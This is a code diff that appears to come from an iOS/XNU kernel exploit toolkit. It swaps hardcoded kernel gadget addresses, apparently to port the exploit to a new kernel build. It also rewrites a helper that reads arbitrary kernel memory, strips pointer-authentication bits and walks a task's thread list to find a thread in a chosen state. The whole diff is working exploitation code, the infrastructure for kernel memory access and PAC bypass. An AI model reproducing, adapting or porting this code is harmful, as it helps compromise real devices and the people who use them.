@@ -18,10 +18,12 @@
 #include "slider.h"
 #include "util_assert.h"
 
+//#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00078f3cbc
+//#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9ea8
 
 #define KALLOC_TO_KERNEL_MAP_SWITCH_LEN 64512
-#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00078f3cbc
-#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9ea8
+#define LR_ENSURE_CAPACITY_KFREE 0xfffffe00079114a4
+#define LR_LCK_RW_LOCK_EXCLUSIVE_GEN 0xfffffe00072b9e54
 #define STACK_SCAN_SIZE 8192
 
 
@@ -57,17 +59,18 @@ void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
 }
 
 int xe_util_pacda_find_thread_with_state(uintptr_t proc, int state, uintptr_t* ptr_out) {
-    uintptr_t main_uthread = xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_P_UTHLIST_OFFSET));
-    uintptr_t cursor = main_uthread;
-    while (cursor != 0) {
-        uintptr_t thread = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_UTHREAD_MEM_UU_THREAD_OFFSET));
+    uintptr_t task = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_TASK_OFFSET)));
+    
+    uintptr_t thread = xe_kmem_read_uint64(KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET));
+    while (thread != 0 && thread != KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET)) {
         int thread_state = xe_kmem_read_int32(KMEM_OFFSET(thread, TYPE_THREAD_MEM_STATE_OFFSET));
         if (thread_state == state) {
             *ptr_out = thread;
             return 0;
         }
-        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_UTHREAD_MEM_UU_LIST_OFFSET));
+        thread = xe_kmem_read_uint64(KMEM_OFFSET(thread, TYPE_THREAD_MEM_TASK_THREADS_OFFSET));
     }
+    
     return ENOENT;
 }
 
